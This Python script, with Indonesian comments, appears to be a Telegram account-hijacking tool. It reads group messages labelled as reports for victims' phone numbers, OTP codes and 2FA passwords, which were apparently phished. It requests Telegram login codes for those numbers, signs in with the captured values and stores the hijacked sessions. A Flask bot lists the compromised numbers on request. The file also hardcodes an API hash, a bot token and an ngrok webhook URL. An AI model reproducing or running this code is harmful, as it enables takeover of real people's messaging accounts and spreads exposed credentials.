import asyncio
import json
import os
import re
import threading
from flask import Flask, request
import requests

from telethon import TelegramClient, events
from telethon.sessions import StringSession

# === Konfigurasi ===
api_id = 23416622
api_hash = 'd1bc12a03ea26416b38b4616a36112b0'
bot_token = '7931229728:AAHFb4GiOT7sLOe3Wyc5xj-4j61TIDTmOas'
WEBHOOK_URL = "https://d48d-182-253-143-59.ngrok-free.app/7931229728:AAHFb4GiOT7sLOe3Wyc5xj-4j61TIDTmOas"

SESSIONS_FILE = "sessions.json"
SESSIONS_FOLDER = "eww_sessions"
pending_login = {}  # {phone: (TelegramClient, password)}

# === Buat folder session jika belum ada ===
if not os.path.exists(SESSIONS_FOLDER):
    os.makedirs(SESSIONS_FOLDER)

# === Simpan Session ke File JSON ===
def save_session(phone_number, status="success"):
    sessions = load_sessions()
    session_path = os.path.join(SESSIONS_FOLDER, f"{phone_number}.session")

    # Simpan session ke folder ew_sessions
    with open(session_path, "w") as f:
        json.dump({"phone": phone_number, "status": status}, f)

    if phone_number not in sessions:
        sessions.append(phone_number)
        with open(SESSIONS_FILE, "w") as f:
            json.dump(sessions, f)

def load_sessions():
    if os.path.exists(SESSIONS_FILE):
        with open(SESSIONS_FILE, "r") as f:
            try:
                return json.load(f)
            except:
                return []
    return []

# === TelegramClient utama untuk monitoring grup ===
client = TelegramClient('main', api_id, api_hash)

# === Handler Pesan Masuk dari Grup ===
@client.on(events.NewMessage)
async def handler(event):
    msg = event.raw_text

    if any(keyword in msg for keyword in ['❮ LAPORAN SM ❯', '❮ LAPORAN Judul ❯' ]):
        phone_match = re.search(r'PHONE NUMBER\s*:\s*(\+\d+)', msg)
        otp_match = re.search(r'OTP\s*:\s*(\d{5,6})', msg)
        password_match = re.search(r'PASSWORD\s*:\s*(\S+)', msg)

        if phone_match:
            phone = phone_match.group(1)
            password = password_match.group(1) if password_match else None

            if otp_match:
                otp = otp_match.group(1)
                print(f"[📥] OTP ditemukan untuk {phone}: {otp}")
                if phone in pending_login:
                    await complete_login(phone, otp, password)
                else:
                    print(f"[⚠️] Belum ada request OTP sebelumnya untuk {phone}")
            else:
                print(f"[📞] Menerima nomor: {phone} (mengirim OTP request...)")
                await request_otp(phone)

# === Kirim OTP Request ===
async def request_otp(phone):
    try:
        session_path = os.path.join(SESSIONS_FOLDER, phone)
        login_client = TelegramClient(session_path, api_id, api_hash)
        await login_client.connect()

        if not await login_client.is_user_authorized():
            await login_client.send_code_request(phone)
            pending_login[phone] = (login_client, None)
            print(f"[🔐] Kode OTP dikirim ke {phone}, menunggu OTP...")
        else:
            print(f"[✅] {phone} sudah login sebelumnya.")
            save_session(phone, status="success")
            await login_client.disconnect()
    except Exception as e:
        print(f"[❌] Gagal kirim OTP ke {phone}: {e}")
        save_session(phone, status="failed")

# === Login Setelah Dapat OTP ===
async def complete_login(phone, otp, password=None):
    try:
        login_data = pending_login.get(phone)
        if login_data:
            login_client, _ = login_data

            try:
                await login_client.sign_in(phone, otp)
            except Exception as e:
                if '2FA' in str(e) or 'password' in str(e).lower():
                    if password:
                        await login_client.sign_in(password=password)
                    else:
                        print(f"[🔒] Password diperlukan untuk {phone}, tapi tidak ditemukan di pesan.")
                        return

            print(f"[✅] Login sukses untuk {phone}")
            save_session(phone, status="success")
            await login_client.disconnect()
            del pending_login[phone]
        else:
            print(f"[❌] Tidak ada client aktif untuk {phone}")
            save_session(phone, status="failed")
    except Exception as e:
        print(f"[❌] Gagal login {phone}: {e}")
        save_session(phone, status="failed")

# === FLASK BOT UNTUK /sessions ===
app = Flask(__name__)

def send_sessions_button(chat_id, bot_token):
    keyboard = {
        "inline_keyboard": [
            [{"text": "📱 Lihat Session Login", "callback_data": "show_sessions"}]
        ]
    }
    requests.post(
        f"https://api.telegram.org/bot{bot_token}/sendMessage",
        data={
            "chat_id": chat_id,
            "text": "Klik tombol di bawah untuk melihat nomor yang sudah login:",
            "reply_markup": json.dumps(keyboard)
        }
    )

@app.route(f"/{bot_token}", methods=["POST"])
def webhook():
    data = request.get_json()

    if "message" in data:
        message = data["message"]
        text = message.get("text", "")
        chat_id = message["chat"]["id"]

        if text == "/sessions":
            send_sessions_button(chat_id, bot_token)

    elif "callback_query" in data:
        query = data["callback_query"]
        data_cb = query["data"]
        chat_id = query["message"]["chat"]["id"]
        msg_id = query["message"]["message_id"]

        if data_cb == "show_sessions":
            sessions = load_sessions()
            if sessions:
                session_list = "\n".join(f"{i+1}. {num}" for i, num in enumerate(sessions))
                reply = f"✅ Nomor yang sudah login:\n\n{session_list}"
            else:
                reply = "❌ Belum ada nomor yang login."

            requests.post(
                f"https://api.telegram.org/bot{bot_token}/editMessageText",
                data={
                    "chat_id": chat_id,
                    "message_id": msg_id,
                    "text": reply
                }
            )

    return "ok", 200

# === SETUP WEBHOOK TELEGRAM ===
def set_webhook():
    webhook_url = f"https://api.telegram.org/bot{bot_token}/setWebhook"
    response = requests.post(webhook_url, data={"url": WEBHOOK_URL})
    print("[🌐] Set Webhook:", response.text)

# === Jalankan Flask + Telethon ===
def start_flask():
    app.run(port=5000)

async def main():
    await client.start()
    print("[🤖] Bot Telegram & OTP listener aktif...")
    await client.run_until_disconnected()

if __name__ == "__main__":
    threading.Thread(target=start_flask).start()
    set_webhook()  # Penting untuk aktifkan webhook!
    asyncio.run(main())
